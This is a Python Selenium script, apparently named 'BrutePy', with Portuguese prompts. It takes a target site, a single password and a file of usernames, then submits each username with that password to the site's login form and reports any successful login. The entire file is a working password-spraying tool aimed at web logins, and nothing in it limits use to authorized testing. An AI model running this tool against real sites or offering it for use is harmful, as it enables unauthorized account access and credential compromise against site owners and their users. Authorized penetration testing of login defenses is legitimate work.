from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, StaleElementReferenceException, ElementClickInterceptedException, ElementNotInteractableException
import time

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
RESET = "\033[0m"

print(f"{BLUE}------------------------------------------------------{RESET}")

print(f"""
{BLUE}__________                __        __________        
\______   \_______ __ ___/  |_  ____\______   \___.__.
 |    |  _/\_  __ \  |  \   __\/ __ \|     ___<   |  |
 |    |   \ |  | \/  |  /|  | \  ___/|    |    \___  |
 |______  / |__|  |____/ |__|  \___  >____|    / ____|
        \/                         \/          \/     

 _________.__.__  .__       .__  __  .__       .__     
{RESET}""")
print("\n")

print("Teste de credenciais em formulário WEB utilizando uma única senha para um grupo X usuários\n")
print("\n")
site = input(f"{BLUE}Site: {RESET}\n")
print("\n")
password = input(f"{BLUE}Senha: {RESET}\n")
print("\n")
userlist_path = input(f"{BLUE}Caminho da lista de usuários: {RESET}\n")
print("\n")


print(f"{YELLOW}Aguarde...{RESET}\n")

driver = webdriver.Chrome()
print(f"{BLUE}Acessando URL: {site}{RESET}")
driver.get(site)

with open(userlist_path, 'r') as file:
    users = file.readlines()

for user in users:
    user = user.strip() 
    print(f"{BLUE}Testando usuário: {user}{RESET}")

    try:
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'username'))
        )
        username_field.clear()
        username_field.send_keys(user)

        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'password')) 
        )
        password_field.clear()
        password_field.send_keys(password)

        login_button = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'submit'))
        )
        login_button.click()

        
        time.sleep(2)

        if "Bem-vindo" in driver.page_source or "Login successful" in driver.page_source:
            print(f"{GREEN}Credenciais encontradas! Usuário: {user}, Senha: {password}{RESET}")
            break
        else:
            print(f"{RED}[-] Credenciais inválidas! Usuário: {user}, Senha: {password}{RESET}")
    except (NoSuchElementException, TimeoutException, StaleElementReferenceException, ElementClickInterceptedException, ElementNotInteractableException) as e:
        print(f"{RED}Erro! {user}: {e}{RESET}")
        driver.refresh()  # 
        continue
else:
    print(f"{RED}Nenhuma credencial é valida.{RESET}")

driver.quit()
